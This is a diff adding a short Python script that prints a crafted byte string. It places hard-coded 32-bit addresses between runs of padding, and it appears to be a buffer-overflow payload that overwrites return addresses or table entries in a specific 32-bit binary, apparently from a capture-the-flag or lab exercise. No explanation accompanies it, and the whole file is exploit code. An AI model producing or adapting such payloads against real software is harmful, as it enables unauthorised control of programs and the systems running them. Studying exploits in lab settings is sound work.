@@ -1,0 +1,4 @@
+data =  "\xd8\x84\x04\x08"
+data += " " * 74 + "\x5a\x84\x04\x08"
+data += " " * 302 + "\x14\xa0\x04\x08"
+print(data)
